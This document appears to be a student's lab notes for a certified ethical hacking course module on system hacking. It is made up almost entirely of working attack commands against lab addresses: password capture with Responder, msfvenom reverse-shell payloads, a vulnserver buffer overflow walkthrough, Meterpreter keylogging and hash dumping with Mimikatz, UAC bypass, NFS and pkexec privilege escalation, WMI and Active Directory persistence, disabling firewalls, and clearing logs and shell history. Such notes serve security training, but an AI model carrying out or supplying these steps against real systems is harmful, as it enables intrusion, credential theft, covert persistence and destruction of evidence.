# System hacking

## Gain access to the system

- Perform active online attack to crack the system’s password using Responder

```bash
responder -I eth0 ---------------  sudo ./Responder.py -I ens3
sudo john /home/ubuntu/Responder/logs/[Log File Name.txt]
```

- Audit system passwords using L0phtCrack  
    Password Auditing Wizard

- Find vulnerabilities on exploit sites  
    <https://www.exploit-db.com/>  
    VulDB <https://vuldb.com>  
    MITRE CVE <https://cve.mitre.org>  
    Vulners <https://vulners.com>  
    CIRCL CVE Search <https://cve.circl.lu>  

- Exploit client-side vulnerabilities and establish a VNC session  
    `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -fexe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe`

```bash
msfconsole
use exploit/multi/handler
...
```
  
`upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1`  
`powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”`  
`run vnc`  

- Gain access to a remote system using Armitage  
    1. Pentesting --> Exploitation Tools --> MetasploitFramework --> armitage  
    2. Nmap Scan --> Intense Scan  
    3. Create payload  
    4. Work with meterpreter shell

- Gain access to a remote system using Ninja Jonin
    Ninja is installed in victim machine  
    Jonin is installed on the attacker machine  
    Modifiy constants.json set ip and port  
    when receiving access denied on listener "list" -> "connect 1" -> change -> cmd

- Perform buffer overflow attack to gain access to a remote system  
    1. Start vulnserver as administrator  
    2. Start and attach to process Immunity debugger  
    3. Create file:  
        trun.spk  
            s_readline();  
            s_string("TRUN ");  
            s_string_variable("0");  
        generic_send_tcp 10.10.1.11 9999 trun.spk 0 0
    4. Relaunch vulnserver  
    5. execute fuzz.py
    6. generate pattern /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900
    7. relaunch vulnserver
    8. execute findoff.py after pasting pattern
    9. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337 (last value from EIP in immunity debugger)  
    10. overwrite.py
    11. badchars.py  
    12. in immunity debugger: 
        follow in DUMP ESP value (right click)  
    13. restart immunity debugger:  
        !mona modules (copy mona.py in pycommands program files immunity debugger)  
    14. /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb  
        JMP ESP  --> FFE4  
        EXIT
    15. !mona find -s “\xff\xe4” -m essfunc.dll --> 0x625011af  
    16. set breakpoint with go to disassembler and execute jump.py  
    17. msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.13 LPORT=4445 EXITFUNC=thread -f c -ax86 -b “\x00”
    19. nc -lvnp 4445
    18. copy the generated shellcode and execute shellcode.py

## Perform privilege escalation to gain higher privileges

- Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities  
    `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe >/home/attacker/Desktop/Exploit.exe`  
    start msfconsole (exploit -j -z)  
    beRoot.exe    
    Seatbelt.exe -group=system  
    Seatbelt.exe -group=user  
    Seatbelt.exe -group=misc  
                 -group=all  
                 -group=slack  
                 -group=chromium  
                 -group=remote  
                                -outputfile=""  
    `use exploit/windows/local/bypassuac_fodhelper` --> `getsystem -t 1`  
    `run post/windows/gather/smart_hashdump` --> dump hash  

- Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter

```bash
getuid
timestomp file -m
keyscan_start
keyscan_dump
idletime
```

```bash
dir /a:h
sc queryex type=service state=all
netsh firewall show state
netsh firewall show config
wmic /node:"" product get name,version,vendor
wmic cpu get
wmic useraccount get name,sid
wmic os where Primary='TRUE' reboot
netsh advfirewall set currentprofile state off
netsh advfirewall set allprofiles state off
```

- Escalate privileges by exploiting vulnerability in pkexec
CVE-2021-4034
make

- Escalate privileges in Linux machine by exploiting misconfigured NFS

```bash
sudo apt install nfs-kernel-server
sudo nano /etc/exports --> /home *(rw,no_root_squash)
sudo /etc/init.d/nfs-kernel-server restart
```

```bash
to configure nfs server
    sudo nano /etc/exports
-- type /home *(rw,no_root_squash)

sudo apt-get install nfs-common
showmount -e 10.10.1.9
sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
sudo cp /bin/bash .
sudo chmod +s bash
ps -ef
```

- Escalate privileges by bypassing UAC and exploiting Sticky Keys

```bash
use post/windows/manage/sticky_keys
```

- Escalate privileges to gather hashdump using Mimikatz  
    `load kiwi`  
    `lsa_dump_sam`  
    `lsa_dump_secrets`  
    `password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password`  

## Maintain remote access and hide malicious activities

- User system monitoring and surveillance using Power Spy  
windows software

- User system monitoring and surveillance using Spytech SpyAgent  
windows software

- Hide files using NTFS streams  
type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe  
mklink backdoor.exe readme.txt:calc.exe

- Hide data using white space steganography  
snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt  
snow -C -p "magic" readme2.txt

- Image steganography using OpenStego and StegOnline  
openstego windows software  
<https://stegonline.georgeom.net/upload>

- Maintain persistence by abusing boot or logon autostart execution  
`cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”`

- Maintain domain persistence by exploiting Active Directory Objects  
When an Active Directory group is marked a protected group; Active Directory will ensure that the owner, the ACLs and the inheritance applied on this group are the same as the ones applied on AdminSDHolder container  

after getting a meterpreter shell  
    `upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads`  
    `powershell`  
        `Import-Module ./powerview.psm1`  
        `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All`  
        `Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs`  
        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /TREG_DWORD /F /D 300`  
        `net group “Domain Admins” Martin /add /domain`

- Privilege escalation and maintain persistence using WMI  
`upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads`  
`load powershell`  
`powershell_shell`  
`Import-Module ./WMI-Persistence.ps1`  
`Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe”`

- Covert channels using Covert_TCP  
`cc -o covert_tcp covert_tcp.c`  
`tcpdump -nvvx port 8888 -i lo`  
`./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file/home/ubuntu/Desktop/Receive/receive.txt`  
`./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file/home/attacker/Desktop/Send/message.txt`

## Clear logs to hide the evidence of compromise

- View, enable, and clear audit policies using Auditpol
windows tool
auditpol /get /category:*
auditpol /set /category:"system","account logon" /success:enable /failure:enable --> to enable
auditpol /clear /y

- Clear Windows machine logs using various utilities
Clear_Event_Viewer_Logs.bat

wevtutil el
wevtutil cl [log_name]

cipher /w:[Drive or Folder or File Location] -- The Cipher.exe utility starts overwriting the deleted files, first, with all zeroes (0x00); second, with all 255s (0xFF); and finally,with random numbers

- Clear Linux machine logs using the BASH shell

export HISTSIZE=0 -- disable shell log
history -c
shred ~/.bash_history && cat /dev/null >.bash_history

- Hiding artifacts in windows and Linux machines
folder
    attrib +h +s +r Test (attrib -s -h -r Test)
user
    net user Test /add
    net user Test /active:yes
    net user Test /active:no
on linux 
    prepend . in file name

- Clear Windows machine logs using CCleaner
windows software
